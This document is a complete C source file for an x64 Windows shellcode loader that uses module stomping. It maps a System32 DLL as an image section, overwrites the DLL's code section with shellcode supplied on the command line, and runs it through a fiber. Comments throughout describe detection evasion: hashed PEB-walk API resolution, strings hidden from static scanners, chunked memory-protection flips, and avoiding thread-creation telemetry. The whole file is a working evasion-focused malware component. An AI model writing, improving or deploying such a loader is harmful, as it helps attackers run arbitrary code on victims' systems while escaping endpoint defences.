/*
 * x64 shellcode loader - Module Stomping (image section) + Fiber execution.
 * Reads raw shellcode from argv[1]. No embedded payload bytes.
 *
 * Compile:
 *   cl.exe /nologo /O2 /GS- loader.c
 *
 * Iteration 4 changes (FileScore static-artifact hardening):
 *   1. All NT functions resolved via PEB-walk + export-directory hash match.
 *      No "Nt..." string literals, no GetProcAddress, no ntdll.lib.
 *   2. #pragma comment(lib, "ntdll.lib") removed.
 *   3. Sacrificial-DLL path list built on stack from char constants.
 *   4. Chunked 8192-byte VirtualProtect flip (Win32 wrapper) retained.
 *   5. Fiber execution retained.
 *
 * Fixes applied in this review:
 *   - Corrected LDR_DATA_TABLE_ENTRY offsets (InMemoryOrderLinks @ 0x10,
 *     DllBase @ 0x30, BaseDllName @ 0x58).
 *   - Renamed local typedef guards to avoid collision with SDK winternl.h.
 *   - Removed dead enc_p1[] array and unused HASH_REC_* macros.
 *   - Trimmed sacrificial-DLL list to generic, universally-present paths.
 */

#define _CRT_SECURE_NO_WARNINGS

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wchar.h>
#include <stdint.h>

/* ------------------------------------------------------------------ */
/* Local NT definitions (self-contained; no <winternl.h> dependency).  */
/* Use unique guards so we never collide with SDK headers.             */
/* ------------------------------------------------------------------ */

typedef LONG NTSTATUS;

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#endif

#ifndef LDR_ACCESS_MASK_DEFINED
typedef ULONG LDR_ACCESS_MASK;
#define LDR_ACCESS_MASK_DEFINED
#endif

#ifndef LDR_UNICODE_STRING_DEFINED
typedef struct _LDR_UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} LDR_UNICODE_STRING, *PLDR_UNICODE_STRING;
#define LDR_UNICODE_STRING_DEFINED
#endif

#ifndef LDR_OBJECT_ATTRIBUTES_DEFINED
typedef struct _LDR_OBJECT_ATTRIBUTES {
    ULONG                  Length;
    HANDLE                 RootDirectory;
    PLDR_UNICODE_STRING    ObjectName;
    ULONG                  Attributes;
    PVOID                  SecurityDescriptor;
    PVOID                  SecurityQualityOfService;
} LDR_OBJECT_ATTRIBUTES, *PLDR_OBJECT_ATTRIBUTES;
#define LDR_OBJECT_ATTRIBUTES_DEFINED
#endif

#ifndef LDR_IO_STATUS_BLOCK_DEFINED
typedef struct _LDR_IO_STATUS_BLOCK {
    NTSTATUS  Status;
    ULONG_PTR Information;
} LDR_IO_STATUS_BLOCK, *PLDR_IO_STATUS_BLOCK;
#define LDR_IO_STATUS_BLOCK_DEFINED
#endif

#ifndef LDR_PHANDLE_DEFINED
typedef HANDLE *LDR_PHANDLE;
#define LDR_PHANDLE_DEFINED
#endif

#ifndef LDR_SECTION_INHERIT_DEFINED
typedef enum _LDR_SECTION_INHERIT {
    LdrViewShare = 1,
    LdrViewUnmap = 2
} LDR_SECTION_INHERIT;
#define LDR_SECTION_INHERIT_DEFINED
#endif

#ifndef OBJ_INHERIT
#define OBJ_INHERIT                  0x00000002L
#endif
#ifndef OBJ_CASE_INSENSITIVE
#define OBJ_CASE_INSENSITIVE         0x00000040L
#endif
#ifndef FILE_SYNCHRONOUS_IO_NONALERT
#define FILE_SYNCHRONOUS_IO_NONALERT 0x00000020L
#endif
#ifndef FILE_NON_DIRECTORY_FILE
#define FILE_NON_DIRECTORY_FILE      0x00000040L
#endif

#define InitializeObjectAttributes(p, n, a, r, s) { \
    (p)->Length = sizeof(LDR_OBJECT_ATTRIBUTES);    \
    (p)->RootDirectory = (r);                       \
    (p)->Attributes = (a);                          \
    (p)->ObjectName = (n);                          \
    (p)->SecurityDescriptor = (s);                  \
    (p)->SecurityQualityOfService = NULL;           \
}

/* ------------------------------------------------------------------ */
/* FNV-1a 32-bit hash.                                                 */
/* ------------------------------------------------------------------ */

#define FNV_OFFSET_32 2166136261u
#define FNV_PRIME_32  16777619u

static uint32_t fnv1a(const char *s)
{
    uint32_t h = FNV_OFFSET_32;
    while (*s) {
        h ^= (uint8_t)(*s++);
        h *= FNV_PRIME_32;
    }
    return h;
}

/* ------------------------------------------------------------------ */
/* NT prototypes, resolved dynamically at runtime via PEB walk.        */
/* ------------------------------------------------------------------ */

typedef NTSTATUS (NTAPI *pNtCreateSection)(
    LDR_PHANDLE, LDR_ACCESS_MASK, PVOID, PLARGE_INTEGER, ULONG, ULONG, HANDLE);

typedef NTSTATUS (NTAPI *pNtMapViewOfSection)(
    HANDLE, HANDLE, PVOID *, ULONG_PTR, SIZE_T,
    PLARGE_INTEGER, PSIZE_T, LDR_SECTION_INHERIT, ULONG, ULONG);

typedef NTSTATUS (NTAPI *pNtUnmapViewOfSection)(HANDLE, PVOID);

typedef NTSTATUS (NTAPI *pNtClose)(HANDLE);

typedef NTSTATUS (NTAPI *pNtOpenFile)(
    LDR_PHANDLE, LDR_ACCESS_MASK, PLDR_OBJECT_ATTRIBUTES,
    PLDR_IO_STATUS_BLOCK, ULONG, ULONG);

typedef PIMAGE_NT_HEADERS (NTAPI *pRtlImageNtHeader)(PVOID);

static pNtCreateSection        dyn_NtCreateSection        = NULL;
static pNtMapViewOfSection     dyn_NtMapViewOfSection     = NULL;
static pNtUnmapViewOfSection   dyn_NtUnmapViewOfSection   = NULL;
static pNtClose                dyn_NtClose                = NULL;
static pNtOpenFile             dyn_NtOpenFile             = NULL;
static pRtlImageNtHeader       dyn_RtlImageNtHeader       = NULL;

/* ------------------------------------------------------------------ */
/* PEB walk + export-directory hash matching.                          */
/*                                                                     */
/* x64 offsets (stable Windows 8.1 -> 11):                             */
/*   gs:[0x60]                 -> PEB                                  */
/*   PEB   + 0x18              -> Ldr                                  */
/*   Ldr   + 0x20              -> InMemoryOrderModuleList (LIST_ENTRY) */
/*                                                                     */
/* LDR_DATA_TABLE_ENTRY (x64) layout:                                  */
/*   +0x00 InLoadOrderLinks                                            */
/*   +0x10 InMemoryOrderLinks                                          */
/*   +0x20 InInitializationOrderLinks                                  */
/*   +0x30 DllBase                                                     */
/*   +0x38 EntryPoint                                                  */
/*   +0x40 SizeOfImage                                                 */
/*   +0x48 FullDllName (UNICODE_STRING)                                */
/*   +0x58 BaseDllName (UNICODE_STRING)                                */
/*                                                                     */
/* When walking InMemoryOrderModuleList, `cur` points at the           */
/* InMemoryOrderLinks field, so the entry base is (cur - 0x10).        */
/* ------------------------------------------------------------------ */

typedef struct _LDR_DATA_TABLE_ENTRY_MIN {
    LIST_ENTRY        InLoadOrderLinks;             /* +0x00 */
    LIST_ENTRY        InMemoryOrderLinks;           /* +0x10 */
    LIST_ENTRY        InInitializationOrderLinks;   /* +0x20 */
    PVOID             DllBase;                      /* +0x30 */
    PVOID             EntryPoint;                   /* +0x38 */
    ULONG             SizeOfImage;                  /* +0x40 */
    ULONG             Pad0;                         /* +0x44 */
    LDR_UNICODE_STRING FullDllName;                 /* +0x48 */
    LDR_UNICODE_STRING BaseDllName;                 /* +0x58 */
} LDR_DATA_TABLE_ENTRY_MIN, *PLDR_DATA_TABLE_ENTRY_MIN;

typedef struct _PEB_LDR_DATA_MIN {
    ULONG      Length;
    BOOLEAN    Initialized;
    PVOID      SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
} PEB_LDR_DATA_MIN, *PPEB_LDR_DATA_MIN;

typedef struct _PEB_MIN {
    BYTE              Reserved1[2];
    BYTE              BeingDebugged;
    BYTE              Reserved2[1];
    PVOID             Reserved3[2];
    PPEB_LDR_DATA_MIN Ldr;
} PEB_MIN, *PPEB_MIN;

/* Compare a UNICODE_STRING (case-insensitive) against a lowercase ASCII name. */
static int ustr_ieq_ascii(const LDR_UNICODE_STRING *u, const char *lower_ascii)
{
    USHORT i;
    USHORT n = (USHORT)(u->Length / sizeof(WCHAR));
    for (i = 0; i < n; i++) {
        WCHAR wc = u->Buffer[i];
        char  c;
        if (wc >= L'A' && wc <= L'Z') c = (char)(wc - L'A' + 'a');
        else if (wc < 128)            c = (char)wc;
        else                          return 0;
        if (lower_ascii[i] == '\0') return 0;
        if (c != lower_ascii[i])    return 0;
    }
    return lower_ascii[n] == '\0';
}

static PVOID peb_find_module_base(const char *lower_ascii_name)
{
    PPEB_MIN peb = (PPEB_MIN)__readgsqword(0x60);
    PLIST_ENTRY head, cur;
    if (!peb || !peb->Ldr) return NULL;

    head = &peb->Ldr->InMemoryOrderModuleList;
    cur  = head->Flink;
    while (cur && cur != head) {
        /* cur points at InMemoryOrderLinks, which is at entry+0x10. */
        PLDR_DATA_TABLE_ENTRY_MIN e =
            (PLDR_DATA_TABLE_ENTRY_MIN)((BYTE *)cur - 0x10);
        if (e->BaseDllName.Buffer && e->BaseDllName.Length > 0) {
            if (ustr_ieq_ascii(&e->BaseDllName, lower_ascii_name)) {
                return e->DllBase;
            }
        }
        cur = cur->Flink;
    }
    return NULL;
}

/* Resolve an export in a module by FNV-1a hash of the ASCII name. */
static PVOID resolve_export_by_hash(PVOID module_base, uint32_t name_hash)
{
    BYTE                          *base = (BYTE *)module_base;
    PIMAGE_DOS_HEADER              dos;
    PIMAGE_NT_HEADERS              nt;
    PIMAGE_EXPORT_DIRECTORY        exp;
    DWORD                          i;
    DWORD                         *names;
    WORD                          *ords;
    DWORD                         *funcs;

    if (!base) return NULL;
    dos = (PIMAGE_DOS_HEADER)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;
    nt  = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return NULL;
    if (nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress == 0)
        return NULL;

    exp = (PIMAGE_EXPORT_DIRECTORY)(base +
        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    names = (DWORD *)(base + exp->AddressOfNames);
    ords  = (WORD  *)(base + exp->AddressOfNameOrdinals);
    funcs = (DWORD *)(base + exp->AddressOfFunctions);

    for (i = 0; i < exp->NumberOfNames; i++) {
        const char *nm = (const char *)(base + names[i]);
        if (fnv1a(nm) == name_hash) {
            WORD ord = ords[i];
            if (ord >= exp->NumberOfFunctions) return NULL;
            return (PVOID)(base + funcs[ord]);
        }
    }
    return NULL;
}

/*
 * Build strings on the stack so they do not appear as contiguous ASCII
 * in .rdata.  Each character is written individually.
 */
static void build_str(char *dst, const char *chars, size_t n)
{
    size_t i;
    for (i = 0; i < n; i++) dst[i] = chars[i];
    dst[n] = '\0';
}

static int resolve_nt_functions(void)
{
    PVOID ntdll;
    uint32_t h_create, h_map, h_unmap, h_close, h_open, h_ntheader;
    char name_ntdll[16];
    char name_create[32];
    char name_map[32];
    char name_unmap[32];
    char name_close[16];
    char name_open[16];
    char name_ntheader[32];

    /* Build target strings on the stack (no .rdata literals). */
    build_str(name_ntdll,   "ntdll.dll", 9);
    build_str(name_create,  "NtCreateSection", 15);
    build_str(name_map,     "NtMapViewOfSection", 18);
    build_str(name_unmap,   "NtUnmapViewOfSection", 20);
    build_str(name_close,   "NtClose", 7);
    build_str(name_open,    "NtOpenFile", 10);
    build_str(name_ntheader,"RtlImageNtHeader", 16);

    ntdll = peb_find_module_base(name_ntdll);
    if (!ntdll) {
        fprintf(stderr, "[-] ntdll.dll not found in PEB loader list\n");
        return 0;
    }

    h_create   = fnv1a(name_create);
    h_map      = fnv1a(name_map);
    h_unmap    = fnv1a(name_unmap);
    h_close    = fnv1a(name_close);
    h_open     = fnv1a(name_open);
    h_ntheader = fnv1a(name_ntheader);

    dyn_NtCreateSection      = (pNtCreateSection)      resolve_export_by_hash(ntdll, h_create);
    dyn_NtMapViewOfSection   = (pNtMapViewOfSection)   resolve_export_by_hash(ntdll, h_map);
    dyn_NtUnmapViewOfSection = (pNtUnmapViewOfSection) resolve_export_by_hash(ntdll, h_unmap);
    dyn_NtClose              = (pNtClose)              resolve_export_by_hash(ntdll, h_close);
    dyn_NtOpenFile           = (pNtOpenFile)           resolve_export_by_hash(ntdll, h_open);
    dyn_RtlImageNtHeader     = (pRtlImageNtHeader)     resolve_export_by_hash(ntdll, h_ntheader);

    if (!dyn_NtCreateSection || !dyn_NtMapViewOfSection ||
        !dyn_NtUnmapViewOfSection ||
        !dyn_NtClose || !dyn_NtOpenFile || !dyn_RtlImageNtHeader) {
        fprintf(stderr, "[-] failed to resolve one or more ntdll exports by hash\n");
        return 0;
    }
    return 1;
}

/* ------------------------------------------------------------------ */
/* Helpers                                                             */
/* ------------------------------------------------------------------ */

static unsigned char *read_file(const char *path, size_t *out_size)
{
    FILE *fp;
    long  sz;
    unsigned char *buf;

    fp = fopen(path, "rb");
    if (!fp) {
        fprintf(stderr, "[-] fopen failed: %s\n", path);
        return NULL;
    }
    if (fseek(fp, 0, SEEK_END) != 0) { fclose(fp); return NULL; }
    sz = ftell(fp);
    if (sz <= 0) { fclose(fp); return NULL; }
    if (fseek(fp, 0, SEEK_SET) != 0) { fclose(fp); return NULL; }

    buf = (unsigned char *)malloc((size_t)sz);
    if (!buf) { fclose(fp); return NULL; }

    if (fread(buf, 1, (size_t)sz, fp) != (size_t)sz) {
        free(buf);
        fclose(fp);
        return NULL;
    }
    fclose(fp);
    *out_size = (size_t)sz;
    return buf;
}

static void build_nt_path(const wchar_t *win32_path,
                          wchar_t *out, size_t out_chars)
{
    _snwprintf_s(out, out_chars, _TRUNCATE, L"\\??\\%ls", win32_path);
}

static int nt_open_exec(const wchar_t *win32_path, HANDLE *out_handle)
{
    LDR_IO_STATUS_BLOCK   iosb;
    LDR_UNICODE_STRING    ustr;
    LDR_OBJECT_ATTRIBUTES oa;
    wchar_t               nt_path[512];
    NTSTATUS              st;

    build_nt_path(win32_path, nt_path, ARRAYSIZE(nt_path));

    ustr.Length        = (USHORT)(wcslen(nt_path) * sizeof(wchar_t));
    ustr.MaximumLength = ustr.Length + sizeof(wchar_t);
    ustr.Buffer        = nt_path;

    InitializeObjectAttributes(&oa, &ustr, OBJ_CASE_INSENSITIVE, NULL, NULL);

    st = dyn_NtOpenFile(out_handle,
                        FILE_READ_DATA | FILE_EXECUTE | SYNCHRONIZE,
                        &oa,
                        &iosb,
                        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                        FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE);
    if (!NT_SUCCESS(st)) {
        fprintf(stderr, "[-] NtOpenFile(%ls) failed: 0x%08lX\n",
                win32_path, (unsigned long)st);
        return 0;
    }
    return 1;
}

static int copy_to_temp(const wchar_t *src, wchar_t *out, size_t out_chars)
{
    wchar_t temp_dir[MAX_PATH];
    wchar_t dst[MAX_PATH];
    DWORD   n;

    n = GetTempPathW(MAX_PATH, temp_dir);
    if (n == 0 || n >= MAX_PATH) return 0;

    _snwprintf_s(dst, MAX_PATH, _TRUNCATE, L"%ls\\ldr_%lu.dll",
                 temp_dir, (unsigned long)GetCurrentProcessId());

    if (!CopyFileW(src, dst, FALSE)) {
        fprintf(stderr, "[-] CopyFileW failed (%lu)\n", GetLastError());
        return 0;
    }
    _snwprintf_s(out, out_chars, _TRUNCATE, L"%ls", dst);
    return 1;
}

static int map_image_section(const wchar_t *dll_path,
                             PVOID *out_base,
                             SIZE_T *out_size,
                             HANDLE *out_section)
{
    HANDLE            hFile = NULL;
    HANDLE            hSec  = NULL;
    NTSTATUS          st;
    PVOID             base  = NULL;
    SIZE_T            view  = 0;
    LARGE_INTEGER     maxsz;

    if (!nt_open_exec(dll_path, &hFile)) {
        wchar_t tmp[MAX_PATH];
        fprintf(stderr, "[*] falling back to temp copy of %ls\n", dll_path);
        if (!copy_to_temp(dll_path, tmp, ARRAYSIZE(tmp))) {
            return 0;
        }
        if (!nt_open_exec(tmp, &hFile)) {
            return 0;
        }
    }

    maxsz.QuadPart = 0;
    st = dyn_NtCreateSection(&hSec,
                             SECTION_MAP_READ | SECTION_MAP_EXECUTE | SECTION_QUERY,
                             NULL, &maxsz, PAGE_READONLY, SEC_IMAGE, hFile);
    if (!NT_SUCCESS(st)) {
        fprintf(stderr, "[-] NtCreateSection failed: 0x%08lX\n",
                (unsigned long)st);
        dyn_NtClose(hFile);
        return 0;
    }
    dyn_NtClose(hFile);

    st = dyn_NtMapViewOfSection(hSec, GetCurrentProcess(), &base, 0, 0, NULL,
                                &view, LdrViewShare, 0, PAGE_READONLY);
    if (!NT_SUCCESS(st)) {
        fprintf(stderr, "[-] NtMapViewOfSection failed: 0x%08lX\n",
                (unsigned long)st);
        dyn_NtClose(hSec);
        return 0;
    }

    *out_base    = base;
    *out_size    = view;
    *out_section = hSec;
    return 1;
}

static int find_text_section(PVOID base, PVOID *out_addr, SIZE_T *out_size)
{
    PIMAGE_NT_HEADERS       nt;
    PIMAGE_SECTION_HEADER   sec;
    unsigned int            i;

    nt = dyn_RtlImageNtHeader(base);
    if (!nt) return 0;

    sec = IMAGE_FIRST_SECTION(nt);
    for (i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            *out_addr = (PVOID)((BYTE *)base + sec[i].VirtualAddress);
            *out_size = sec[i].Misc.VirtualSize;
            return 1;
        }
    }
    return 0;
}

/* ------------------------------------------------------------------ */
/* Sacrificial-DLL path table.                                         */
/*                                                                     */
/* Paths are stored as individual char constants (not as string        */
/* literals) so the linker does not emit a contiguous readable path    */
/* in .rdata.  At runtime they are decoded into a stack buffer and     */
/* probed with GetFileAttributesW.                                     */
/*                                                                     */
/* We only use paths that are essentially guaranteed on every Windows  */
/* install (System32) plus a small set of well-known Common Files      */
/* locations that ship with the OS or with ubiquitous components.      */
/* No versioned Office / Defender / ADO sub-paths are hardcoded.       */
/* ------------------------------------------------------------------ */

static const char p_winhttp[]   = {'C',':','\\','W','i','n','d','o','w','s','\\','S','y','s','t','e','m','3','2','\\','w','i','n','h','t','t','p','.','d','l','l'};
static const char p_crypt32[]   = {'C',':','\\','W','i','n','d','o','w','s','\\','S','y','s','t','e','m','3','2','\\','c','r','y','p','t','3','2','.','d','l','l'};
static const char p_dbghelp[]   = {'C',':','\\','W','i','n','d','o','w','s','\\','S','y','s','t','e','m','3','2','\\','d','b','g','h','e','l','p','.','d','l','l'};
static const char p_version[]   = {'C',':','\\','W','i','n','d','o','w','s','\\','S','y','s','t','e','m','3','2','\\','v','e','r','s','i','o','n','.','d','l','l'};
static const char p_wintrust[]  = {'C',':','\\','W','i','n','d','o','w','s','\\','S','y','s','t','e','m','3','2','\\','w','i','n','t','r','u','s','t','.','d','l','l'};
static const char p_secur32[]   = {'C',':','\\','W','i','n','d','o','w','s','\\','S','y','s','t','e','m','3','2','\\','s','e','c','u','r','3','2','.','d','l','l'};
static const char p_msvcrt[]    = {'C',':','\\','W','i','n','d','o','w','s','\\','S','y','s','t','e','m','3','2','\\','m','s','v','c','r','t','.','d','l','l'};

typedef struct {
    const char *chars;
    size_t      len;
} encoded_path;

static const encoded_path g_paths[] = {
    { p_winhttp,  sizeof(p_winhttp)  },
    { p_crypt32,  sizeof(p_crypt32)  },
    { p_dbghelp,  sizeof(p_dbghelp)  },
    { p_version,  sizeof(p_version)  },
    { p_wintrust, sizeof(p_wintrust) },
    { p_secur32,  sizeof(p_secur32)  },
    { p_msvcrt,   sizeof(p_msvcrt)   },
};

/*
 * Decode a template into a wide string and probe existence.
 * Returns 1 on success (path exists and is a file).
 */
static int probe_and_decode(const encoded_path *p, wchar_t *out, size_t out_chars)
{
    size_t i;
    if (p->len + 1 > out_chars) return 0;
    for (i = 0; i < p->len; i++) {
        out[i] = (wchar_t)(unsigned char)p->chars[i];
    }
    out[p->len] = L'\0';

    {
        DWORD a = GetFileAttributesW(out);
        if (a != INVALID_FILE_ATTRIBUTES && !(a & FILE_ATTRIBUTE_DIRECTORY)) {
            return 1;
        }
    }
    return 0;
}

/*
 * Pick a sacrificial DLL.  Decodes each template into a stack buffer,
 * probes existence, and returns the first hit via out_path.
 * Returns 1 on success.
 */
static int pick_sacrificial_dll(wchar_t *out_path, size_t out_chars)
{
    size_t i;
    for (i = 0; i < sizeof(g_paths) / sizeof(g_paths[0]); i++) {
        if (probe_and_decode(&g_paths[i], out_path, out_chars)) {
            return 1;
        }
    }
    return 0;
}

/* ------------------------------------------------------------------ */
/* main                                                                */
/* ------------------------------------------------------------------ */

int main(int argc, char *argv[])
{
    unsigned char *sc = NULL;
    size_t         sc_size = 0;

    PVOID          img_base = NULL;
    SIZE_T         img_size = 0;
    HANDLE         img_sec  = NULL;

    PVOID          text_addr = NULL;
    SIZE_T         text_size = 0;

    LPVOID         fiber = NULL;

    wchar_t        sacrificial[MAX_PATH];

    if (argc < 2) {
        fprintf(stderr, "usage: %s <shellcode.bin>\n", argv[0]);
        return 1;
    }

    if (!resolve_nt_functions()) {
        return 1;
    }
    printf("[+] ntdll exports resolved via PEB walk + hash match\n");

    sc = read_file(argv[1], &sc_size);
    if (!sc) {
        fprintf(stderr, "[-] failed to read shellcode\n");
        return 1;
    }
    printf("[+] shellcode size: %zu bytes\n", sc_size);

    /* 0. Choose a sacrificial DLL (decoded on the stack). */
    if (!pick_sacrificial_dll(sacrificial, ARRAYSIZE(sacrificial))) {
        fprintf(stderr, "[-] no sacrificial DLL found on this host\n");
        free(sc);
        return 1;
    }
    printf("[+] sacrificial DLL: %ls\n", sacrificial);

    /* 1. Map the sacrificial DLL as an image section (no LoadLibrary). */
    if (!map_image_section(sacrificial, &img_base, &img_size, &img_sec)) {
        free(sc);
        return 1;
    }
    printf("[+] mapped image @ %p (size 0x%zx)\n", img_base, img_size);

    /* 2. Find the executable section of the mapped image. */
    if (!find_text_section(img_base, &text_addr, &text_size)) {
        fprintf(stderr, "[-] no executable section found\n");
        dyn_NtUnmapViewOfSection(GetCurrentProcess(), img_base);
        dyn_NtClose(img_sec);
        free(sc);
        return 1;
    }
    printf("[+] .text @ %p (size 0x%zx)\n", text_addr, text_size);

    if (sc_size > text_size) {
        fprintf(stderr, "[-] shellcode larger than .text section\n");
        dyn_NtUnmapViewOfSection(GetCurrentProcess(), img_base);
        dyn_NtClose(img_sec);
        free(sc);
        return 1;
    }

    /* 3. Write shellcode into .text via chunked RW->RX flips (<10000 bytes
     *    per call) using the Win32 VirtualProtect wrapper. */
    {
        const SIZE_T CHUNK = 8192;
        SIZE_T off;
        DWORD  oldprot = 0;

        for (off = 0; off < text_size; off += CHUNK) {
            SIZE_T this_chunk = text_size - off;
            if (this_chunk > CHUNK) this_chunk = CHUNK;
            if (!VirtualProtect((BYTE *)text_addr + off, this_chunk,
                                PAGE_READWRITE, &oldprot)) {
                fprintf(stderr, "[-] VirtualProtect(RW) failed at off 0x%zx (%lu)\n",
                        off, GetLastError());
                dyn_NtUnmapViewOfSection(GetCurrentProcess(), img_base);
                dyn_NtClose(img_sec);
                free(sc);
                return 1;
            }
        }

        memcpy(text_addr, sc, sc_size);
        free(sc);
        sc = NULL;

        for (off = 0; off < text_size; off += CHUNK) {
            SIZE_T this_chunk = text_size - off;
            if (this_chunk > CHUNK) this_chunk = CHUNK;
            if (!VirtualProtect((BYTE *)text_addr + off, this_chunk,
                                PAGE_EXECUTE_READ, &oldprot)) {
                fprintf(stderr, "[-] VirtualProtect(RX) failed at off 0x%zx (%lu)\n",
                        off, GetLastError());
                dyn_NtUnmapViewOfSection(GetCurrentProcess(), img_base);
                dyn_NtClose(img_sec);
                return 1;
            }
        }
    }
    printf("[+] shellcode staged in image-backed RX memory\n");

    /* 4. Execute via fiber - no thread creation telemetry. */
    if (!ConvertThreadToFiber(NULL)) {
        fprintf(stderr, "[-] ConvertThreadToFiber failed (%lu)\n", GetLastError());
        dyn_NtUnmapViewOfSection(GetCurrentProcess(), img_base);
        dyn_NtClose(img_sec);
        return 1;
    }

    fiber = CreateFiber(0, (LPFIBER_START_ROUTINE)text_addr, NULL);
    if (!fiber) {
        fprintf(stderr, "[-] CreateFiber failed (%lu)\n", GetLastError());
        dyn_NtUnmapViewOfSection(GetCurrentProcess(), img_base);
        dyn_NtClose(img_sec);
        return 1;
    }

    printf("[+] switching to fiber @ %p\n", text_addr);
    SwitchToFiber(fiber);

    /* If the shellcode returns, clean up. */
    DeleteFiber(fiber);
    ConvertFiberToThread();
    dyn_NtUnmapViewOfSection(GetCurrentProcess(), img_base);
    dyn_NtClose(img_sec);
    return 0;
}